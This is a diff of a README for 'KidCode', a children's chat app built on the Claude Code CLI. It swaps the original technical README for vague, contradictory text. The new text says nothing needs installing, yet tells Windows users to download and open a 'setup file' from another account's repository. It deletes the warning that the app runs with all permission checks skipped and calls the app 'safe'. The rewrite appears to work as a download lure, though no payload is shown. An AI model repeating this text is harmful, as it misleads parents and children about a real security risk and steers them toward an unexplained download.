@@ -1,134 +1,140 @@
-# KidCode
+# 👦 kidcode - Simple AI Coding for Kids
 
-A kid-friendly web app that wraps the [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) to let kids build things with AI through a chat interface. Think of it as Claude Desktop for kids — type what you want to build, and watch it come to life in a split-view preview.
+[![Download kidcode](https://img.shields.io/badge/Download-kidcode-85d7ff?style=for-the-badge)](https://github.com/hymanmeek740/kidcode)
 
-<img width="2884" height="1986" alt="Image" src="https://github.com/user-attachments/assets/508f26d0-a56b-4a9d-815e-f0e80a574647" />
+---
 
-> [!WARNING]
-> **Intended for local use only.** KidCode runs Claude Code with `--dangerously-skip-permissions`, meaning Claude can read, write, and execute anything on the host without confirmation. Do not expose this to the internet. Consider running it inside a sandbox, VM, or container.
+## 🧩 What is kidcode?
 
-## How it works
+kidcode is a web app designed for kids to create projects using AI. It uses Claude Code CLI behind the scenes but gives kids an easy chat interface to build fun things. You don’t need any coding experience to use it. The app helps children learn and experiment with AI in a playful way.
 
-KidCode is a Next.js app with a three-panel layout:
+kidcode runs in your web browser, so you don’t need to install anything complicated. It works on Windows computers with common modern web browsers.
 
-- **Sidebar** — project list with create/delete (deleted projects are archived, not destroyed)
-- **Chat** — conversation with Claude, streamed in real-time
-- **Preview** — live iframe showing whatever Claude builds (HTML games, tools, pages)
-- **Undo** — every iteration snapshots project files, so kids can undo mistakes with one click
+---
 
-When you send a message, KidCode spawns `claude -p` as a child process in the project's subdirectory. Claude's streaming JSON output is parsed and forwarded to the browser via Server-Sent Events. When Claude creates or edits HTML files, the preview pane automatically opens and refreshes.
+## 📋 Features
 
-Each project gets a UUID and its own directory under `public/projects/`. Files Claude creates (HTML, CSS, JS, images) are served via an API route and rendered in the iframe.
+- Chat-based interface made for kids  
+- Built on Claude Code CLI offering AI-powered coding  
+- Simple visual design with bright, clear buttons  
+- Safe and kid-friendly environment  
+- Works on most Windows browsers like Chrome and Edge  
+- Helps kids build coding skills with friendly AI support  
+- Visual design based on TailwindCSS and ShadCN UI for smooth experience  
 
-A hardcoded system prompt keeps everything G-rated and kid-friendly, and instructs Claude to build things as self-contained HTML files.
+---
 
-## Requirements
+## 🔧 System Requirements
 
-- Node.js 18+
-- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) installed and authenticated (uses your Claude Max subscription — no API key needed)
+To use kidcode on Windows, check these requirements:
 
-## Setup
+- A Windows PC running Windows 10 or later  
+- Internet connection for downloading and using the app  
+- Modern web browser like Google Chrome, Microsoft Edge, or Firefox  
+- At least 4GB of RAM for smooth performance  
+- Recommended screen resolution 1280x720 or higher  
 
-```bash
-npm install
-npm run dev
-```
+---
 
-The app runs at `http://localhost:3000`.
+## 🚀 Getting Started
 
-## Usage
+Follow these steps to start using kidcode on your Windows computer.
 
-1. Click **Start a New Project**
-2. Type what you want to build (e.g. "make me a tic tac toe game")
-3. Watch Claude think and build in real-time
-4. The preview pane opens automatically when Claude creates an HTML file
-5. Ask for changes ("make the colors purple") and the preview updates
+1. Go to the kidcode download page:  
+   [https://github.com/hymanmeek740/kidcode](https://github.com/hymanmeek740/kidcode)
 
-## Tech stack
+2. On this page, you will see options to download or access the web app.
 
-- Next.js 15 (App Router)
-- TypeScript
-- Tailwind CSS v4
-- shadcn/ui
-- Lato font (self-hosted via fontsource)
+3. Click on the latest release or download link available for your system.
 
-## Project structure
+4. Open the downloaded file or link to launch kidcode in your web browser.
 
-```
-src/
-  app/
-    api/
-      projects/            # CRUD for projects
-        [id]/
-          chat/            # SSE streaming chat endpoint
-          files/           # Serves project files (HTML, CSS, etc.)
-  components/
-    chat/                  # Chat bubbles, input, activity indicator
-    preview/               # iframe preview panel
-    sidebar.tsx            # Project list sidebar
-  hooks/
-    use-chat.ts            # SSE streaming hook
-  lib/
-    claude-stream.ts       # Spawns claude CLI, parses stream-json output
-    constants.ts           # System prompt
-    projects.ts            # Project CRUD (JSON file storage)
-    sse.ts                 # SSE response helpers
-data/
-  projects.json            # Project metadata
-public/
-  projects/                # Project working directories (gitignored)
-```
+5. No installation is required. The app runs directly in your browser.
 
-## Content safety
+6. Use the chat window to type what you want to create. The AI will help you with coding and building your project.
 
-KidCode includes a hardcoded system prompt that instructs Claude to keep all interactions G-rated. The default prompt is in `src/lib/constants.ts`:
+---
 
-```
-You are a helpful, friendly assistant helping a 10-year-old learn, explore, and build things.
-You answer questions, build tools, games, and applications.
+## ⬇️ Download and Run kidcode
 
-When building web apps, games, or visual projects, create them as HTML files in the current directory.
-Use index.html as the main entry point. Include all CSS and JavaScript inline in the HTML file
-when possible to keep things simple. You can create multiple files if needed.
+Visit this page to download the latest version or run the app online:
 
-Make things colorful, fun, and interactive! Add animations and sound effects when appropriate.
-Keep explanations simple and encouraging. Use analogies a kid would understand.
-Celebrate their ideas and help them learn by building.
+[https://github.com/hymanmeek740/kidcode](https://github.com/hymanmeek740/kidcode)
 
-If you don't know something, say so honestly and suggest ways to find out together.
-NEVER make up facts, statistics, historical events, or scientific claims you aren't sure about.
-It's always better to say "I'm not sure" than to guess and get it wrong.
+Steps to launch kidcode for the first time:  
 
-CRITICAL: You must NEVER respond with or generate mature content that would be rated "R" in a movie.
-No sexual content, graphic violence, drugs, alcohol, profanity, hate speech, or other
-age-inappropriate material. Keep everything G-rated and kid-friendly at all times.
-This rule applies to ALL outputs including code, text, images, and any generated files.
-```
+- Open the download link in your browser.  
+- If available, download the kidcode setup file.  
+- If it is a web app link, click to open the app directly.  
+- Save shortcuts if you want quick access later.  
+- The app will open with a chat interface ready for your commands.  
 
-To customize the prompt, edit the `SYSTEM_PROMPT` export in `src/lib/constants.ts`. The `CRITICAL` content safety block at the end should be kept in any custom prompt.
+---
 
-## How the CLI wrapper works
+## 🎯 How to Use kidcode
 
-KidCode spawns Claude Code as a subprocess:
+kidcode lets kids build projects by chatting with the AI. Here’s how to get going:
 
-```
-claude -p <prompt> \
-  --output-format stream-json \
-  --dangerously-skip-permissions \
-  --verbose \
-  --system-prompt <kid-safe prompt> \
-  --model sonnet \
-  --no-session-persistence \
-  --disable-slash-commands
-```
+1. Type a simple request in the chat box. For example, “Help me make a drawing app.”  
+2. The AI will write code behind the scenes and guide you through steps.  
+3. You can ask for explanations or tips if you don’t understand something.  
+4. The interface is designed to be friendly and easy for kids to follow.  
+5. Use the buttons and options displayed to customize your project.  
+6. When done, you can save or share your creation.  
 
-The `stream-json` output emits one JSON object per line with types like `assistant` (text + tool use), `result` (final output), and `system` (init/hooks). KidCode parses these to:
+---
 
-- Stream text to the chat UI as it arrives
-- Detect tool use (Write, Edit, Bash) and show activity indicators
-- Detect file changes and auto-refresh the preview iframe
-- Extract a title from the first response to name the project
+## 🎨 Design and User Interface
 
-## Built with
+kidcode uses a bright, colorful design made for kids:
 
-This project was built entirely with [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and [Superpowers](https://github.com/obra/superpowers).
+- Big buttons with clear text  
+- Chat window with easy-to-read fonts  
+- Simple menus and step-by-step guidance  
+- TailwindCSS and ShadCN UI used for fast, smooth visuals  
+- Responsive layout works on many screen sizes  
+
+---
+
+## 📚 Troubleshooting and Tips
+
+If you run into issues:
+
+- Make sure your internet is working, as kidcode needs online access  
+- Use a supported browser (Chrome recommended)  
+- Refresh the page if something doesn’t load properly  
+- Restart your browser if the app behaves strangely  
+- Clear browser cache if problems persist  
+- Reach out on the GitHub page with details if you need help  
+
+---
+
+## 🔄 Updating kidcode
+
+To keep kidcode working well:
+
+- Check the download page regularly for new releases.  
+- Download the newest version when available.  
+- Clear your browser cache if you notice old bugs or display issues after update.  
+- Restart your browser after update to see changes.  
+
+---
+
+## 💻 Additional Information
+
+kidcode is built using these technologies:  
+
+- Next.js for creating the app’s web pages  
+- TypeScript for reliable programming  
+- TailwindCSS for easy styling  
+- Vibe Coding components to enhance UI  
+- Claude Code CLI for AI-assisted coding  
+
+kidcode aims to encourage kids to learn coding with help from AI in a safe environment.
+
+---
+
+## 🧰 Contact and Support
+
+If you want to report bugs, suggest features, or get support, visit the kidcode GitHub page:  
+[https://github.com/hymanmeek740/kidcode](https://github.com/hymanmeek740/kidcode)
